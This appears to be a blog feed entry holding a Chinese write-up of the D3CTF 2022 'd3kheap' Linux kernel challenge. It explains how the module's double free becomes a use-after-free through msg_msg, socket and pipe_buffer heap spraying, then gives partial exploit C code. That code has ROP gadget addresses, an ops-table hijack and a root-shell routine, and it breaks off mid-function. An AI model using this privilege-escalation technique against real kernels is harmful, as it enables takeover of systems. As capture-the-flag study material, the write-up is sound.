{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"c语言\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-d3kheap/",
            "title": "教你学内核-d3kheap",
            "date_published": "2022-11-04T05:10:27.000Z",
            "content_html": "<blockquote>\n<p>确实没鸽</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"d3ctf-2022-d3kheap\"><a class=\"markdownIt-Anchor\" href=\"#d3ctf-2022-d3kheap\">#</a> D3CTF 2022 D3Kheap</h1>\n<p>这题属实抽象，mod 模块啥都没给，就给了申请完堆块两次 free 的机会，那么我们就需要控制许多内核结构体来完成对 double free 到 uaf 的转化，随后逐步劫持结构体的控制流</p>\n<h2 id=\"背景知识\"><a class=\"markdownIt-Anchor\" href=\"#背景知识\">#</a> 背景知识</h2>\n<p>我们都学过操作系统，那就绕不开通信的问题，无论是进程间通信，还是网络编程，linux 都给了我们很多函数，比如说消息队列 msg_queue，套接字 socket，管道 pipe 等等，那么既然是进程间通信，必须会使用到内核空间，因此也一定申请内核堆块，创建结构体，因此需要从这些结构体，完成对 double free 的利用。</p>\n<h3 id=\"消息队列-msg_queue\"><a class=\"markdownIt-Anchor\" href=\"#消息队列-msg_queue\">#</a> 消息队列 msg_queue</h3>\n<p>有如下函数：msgget，msgsnd，msgrcv</p>\n<p>在使用函数 msgget 创建一个消息队列时，会创建一个 msg_queue 结构体，如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_queue</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//msg队列结构体</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">kern_ipc_perm</span> q_perm<span class=\"token punctuation\">;</span> <span class=\"token comment\">//每个ipc 相关结构体都要有q_perm</span>\n\ttime64_t q_stime<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* last msgsnd time */</span>\n\ttime64_t q_rtime<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* last msgrcv time */</span>\n\ttime64_t q_ctime<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* last change time */</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> q_cbytes<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* 当前消息队列中的字节数 */</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> q_qnum<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* 当前消息队列中的消息数 */</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> q_qbytes<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* 消息队列中允许的最大字节数 */</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid</span> <span class=\"token operator\">*</span>q_lspid<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* pid of last msgsnd */</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">pid</span> <span class=\"token operator\">*</span>q_lrpid<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* last receive pid */</span>\n\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> q_messages<span class=\"token punctuation\">;</span><span class=\"token comment\">/* 消息队列 */</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> q_receivers<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> q_senders<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> __randomize_layout<span class=\"token punctuation\">;</span></code></pre>\n<p>使用 msgsnd 向该消息发送一段消息时，会创建一个 msg_msg 结构体，如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//主消息段头部</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span> m_list<span class=\"token punctuation\">;</span> <span class=\"token comment\">//消息双向链表指针</span>\n\t<span class=\"token keyword\">long</span> m_type<span class=\"token punctuation\">;</span>\n\tsize_t m_ts<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* 消息大小 */</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msgseg</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span> <span class=\"token comment\">//指向消息第二段</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>security<span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* 后面接着消息的文本 */</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msgseg</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//子消息段头部</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msgseg</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span> <span class=\"token comment\">//指向下一段的指针，最多三段</span>\n\t<span class=\"token comment\">/* 后面接着消息第二/三段的文本 */</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></code></pre>\n<p>我们注意到 q_messages 和 m_list 的两个指针，这两个指针实际上会互相指向形成一个双向链表，而当消息长度 大于 0x1000 时会启用 next 指针指向一个 msg_msgseg 结构体来存放多于的数据，再次发送消息便又会创建 msg_msg 结构体，使用 m_list 来互相链接，用 msg_queue 作为队列头形成一个消息队列</p>\n<blockquote>\n<p>这里 m_ts 表示消息的长度，如果 m_ts 改大 而 next 为空时，便会发生越界读取数据，而当 next 存在指针时，便会实现任意地址读取</p>\n</blockquote>\n<p>可以看到 结构体的大小不是固定的，因此可以达到一个任意大小堆块申请的效果</p>\n<h3 id=\"套接字-socket\"><a class=\"markdownIt-Anchor\" href=\"#套接字-socket\">#</a> 套接字 socket</h3>\n<p>可以使用 socketpair 创建一个 socket 会返回一对 fd ，其结构体无所谓，但是向其中写入数据时会申请 object ，其中 object 可以是 大于 320 的任意大小，当然这个 320 并不在头部，不然也就不好控了</p>\n<p><a href=\"https://blog.csdn.net/wangquan1992/article/details/112572572\">https://blog.csdn.net/wangquan1992/article/details/112572572</a></p>\n<p>从另一端读取 socket 就会释放掉该堆块</p>\n<h3 id=\"管道pipe\"><a class=\"markdownIt-Anchor\" href=\"#管道pipe\">#</a> 管道 pipe</h3>\n<p>使用 pipe 创建一对 pipe 会返回一对 fd ，这里同样是对 pipe_buffer 进行说明，这里比较特别，内核总会用掉许多 pipe_buffer 使其刚好申请 0x400 大小的堆块</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pipe_buffer</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">page</span> <span class=\"token operator\">*</span>page<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">pipe_buf_operations</span> <span class=\"token operator\">*</span>ops<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> flags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> private<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></code></pre>\n<blockquote>\n<p>其 ops 是一个函数表指针，可以使用它泄露地址，也可以用其来劫持控制流</p>\n</blockquote>\n<p>从另一端读取 pipe 就会释放掉该堆块</p>\n<h2 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路</h2>\n<ol>\n<li>首先打开 socket 和 msg 等后面需要的结构体；</li>\n<li>使用 模块功能 申请一个大小为 1024 的堆块；</li>\n<li>不断使用 msgsnd 创建消息，此时控制大小便会创建相应大小的堆块，在过程中使用 模块功能 释放掉该 1024 大小的堆块，此时 msg_msg 就有可能分配到 该位置；</li>\n<li>使用 模块功能 释放掉该 1024 大小的堆块，此时某一个 msg_queue 结构体被破坏，msg_msg 虽然被释放但是依旧存在在这个队列里；</li>\n<li>不断向 socket 写数据来堆喷到 msg_msg ，此时已经可以控制 msg_msg 结构体，改大 msg_msg 的 size；</li>\n<li>通过 特殊字段 flag 的 msgrcv 来查看 msg_queue 的队列消息是否存在，不存在则返回 -1 ，此时我们的 msg_msg 结构体已经可控，因此改乱它使其返回 -1 从而来找出已经可控的 msg_msg 结构体；</li>\n<li>接受 socket 另一端释放掉堆块，并再次使用 socket 写数据来申请堆块去修改 msg_msg 结构体，此时改大其 size 位，让其 msg_msg 能够越界泄露出数据；</li>\n<li>通过 特殊字段 flag 的 msgrcv 来越界泄露出 堆地址，此时已经知道哪个 msg_queue 出问题，因此可以直接定位到该 msg_msg 结构，因为泄露出来的是相邻堆块的指针，并且其 prev 指针指向了 队列的前一个消息；</li>\n<li>重复 7、8 步，而此时 msg_msg 结构体的 next 因为已经泄露出了 堆地址，所以是可控的，再次泄露出 可控 msg_msg 堆块的地址（这里简单计算就可以得到）；</li>\n<li>使用 msgrcv 把数据接受掉从而释放该 msg_msg，同时 socket 的某一个 object 已经被释放掉了；</li>\n<li>堆喷 pipe 结构体，此时 socket 的某一个 object 已经被分配到了 pipe_buffer 结构体中，因此使用 socket 另一端读的时候便会读到 pipe_buffer 结构体的内容，pipe_buffer 有个 内核指针，因此通过其计算出 内核基地址，此时该 object 已经被 socket  释放；</li>\n<li>再次使用 socket 写数据申请堆块到 pipe_buffer，并劫持掉 ops 函数表，最后关闭 pipe 执行 栈迁移 并 rop。</li>\n</ol>\n<p>exp 按照官方的改了改（指翻译成中文），有机会完全自己做一下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">_GNU_SOURCE</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;err.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;inttypes.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sched.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ipc.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/msg.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/socket.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">MSG_TAG <span class=\"token number\">0x41414141</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">PRIMARY_MSG_TYPE <span class=\"token number\">1</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SECONDARY_MSG_TYPE <span class=\"token number\">2</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">VICTIM_MSG_TYPE <span class=\"token number\">0x11037</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SK_BUFF_NUM <span class=\"token number\">0x80</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">PIPE_NUM <span class=\"token number\">0x100</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SOCKET_NUM <span class=\"token number\">0x10</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">MSG_QUEUE_NUM <span class=\"token number\">0x1000</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">PRIMARY_MSG_SIZE <span class=\"token number\">0x60</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SECONDARY_MSG_SIZE <span class=\"token number\">0x400</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">COMMIT_CREDS <span class=\"token number\">0xffffffff810D25C0</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">POP_RDI_RET <span class=\"token number\">0xffffffff810938f0</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">INIT_CRED <span class=\"token number\">0xffffffff82c6d580</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">ANON_PIPE_BUF_OPS <span class=\"token number\">0xffffffff8203fe40</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">PUSH_RSI_POP_RSP_POP_4VAL_RET <span class=\"token number\">0xffffffff812dbede</span></span></span>\n\n<span class=\"token comment\">// 此 gadget 是在 __mmu_interval_notifier_insert 附近错出的一个 gadget</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class=\"token number\">0xffffffff81c00ff0</span></span></span>\n\n\nsize_t kernel_offset<span class=\"token punctuation\">,</span> kernel_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\n * object 大小必会加上 320，因此需要申请 704 的大小\n * 1024 - 320 = 704\n */</span>\n<span class=\"token keyword\">char</span> fake_secondary_msg<span class=\"token punctuation\">[</span><span class=\"token number\">704</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">list_head</span><span class=\"token punctuation\">&#123;</span>\n    uint64_t    next<span class=\"token punctuation\">;</span>\n    uint64_t    prev<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>list_head<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span><span class=\"token punctuation\">&#123;</span>\n    list_head   m_list<span class=\"token punctuation\">;</span>\n    uint64_t    m_type<span class=\"token punctuation\">;</span>\n    uint64_t    m_ts<span class=\"token punctuation\">;</span>\n    uint64_t    next<span class=\"token punctuation\">;</span>\n    uint64_t    security<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>msg_msg<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msgseg</span><span class=\"token punctuation\">&#123;</span>\n    uint64_t    next<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>msg_msgseg<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> mtype<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> mtext<span class=\"token punctuation\">[</span>PRIMARY_MSG_SIZE <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>primary_msg<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> mtype<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> mtext<span class=\"token punctuation\">[</span>SECONDARY_MSG_SIZE <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>secondary_msg<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">long</span> mtype<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> mtext<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msgseg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> oob_msg<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">pipe_buffer</span>\n<span class=\"token punctuation\">&#123;</span>\n    uint64_t    page<span class=\"token punctuation\">;</span>\n    uint32_t    offset<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">;</span>\n    uint64_t    ops<span class=\"token punctuation\">;</span>\n    uint32_t    flags<span class=\"token punctuation\">;</span>\n    uint32_t    padding<span class=\"token punctuation\">;</span>\n    uint64_t    private<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>pipe_buffer<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">pipe_buf_operations</span>\n<span class=\"token punctuation\">&#123;</span>\n    uint64_t    confirm<span class=\"token punctuation\">;</span>\n    uint64_t    release<span class=\"token punctuation\">;</span>\n    uint64_t    try_steal<span class=\"token punctuation\">;</span>\n    uint64_t    get<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>pipe_buf_operations<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[34m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">lg</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Data] %s : \\033[0m\\033[35m\\033[1m%#lx \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1234</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0xDEAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">buildMsg</span><span class=\"token punctuation\">(</span>\n    msg_msg <span class=\"token operator\">*</span>msg<span class=\"token punctuation\">,</span> \n    uint64_t m_list_next<span class=\"token punctuation\">,</span>\n    uint64_t m_list_prev<span class=\"token punctuation\">,</span> \n    uint64_t m_type<span class=\"token punctuation\">,</span> \n    uint64_t m_ts<span class=\"token punctuation\">,</span> \n    uint64_t next<span class=\"token punctuation\">,</span> \n    uint64_t security\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    msg<span class=\"token operator\">-></span>m_list<span class=\"token punctuation\">.</span>next <span class=\"token operator\">=</span> m_list_next<span class=\"token punctuation\">;</span>\n    msg<span class=\"token operator\">-></span>m_list<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">=</span> m_list_prev<span class=\"token punctuation\">;</span>\n    msg<span class=\"token operator\">-></span>m_type <span class=\"token operator\">=</span> m_type<span class=\"token punctuation\">;</span>\n    msg<span class=\"token operator\">-></span>m_ts <span class=\"token operator\">=</span> m_ts<span class=\"token punctuation\">;</span>\n    msg<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> next<span class=\"token punctuation\">;</span>\n    msg<span class=\"token operator\">-></span>security <span class=\"token operator\">=</span> security<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">writeMsg</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> msqid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>msgp<span class=\"token punctuation\">,</span> size_t msgsz<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> msgtyp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>msgp <span class=\"token operator\">=</span> msgtyp<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">msgsnd</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">,</span> msgp<span class=\"token punctuation\">,</span> msgsz <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">readMsg</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> msqid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>msgp<span class=\"token punctuation\">,</span> size_t msgsz<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> msgtyp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">msgrcv</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">,</span> msgp<span class=\"token punctuation\">,</span> msgsz <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msgtyp<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">peekMsg</span><span class=\"token 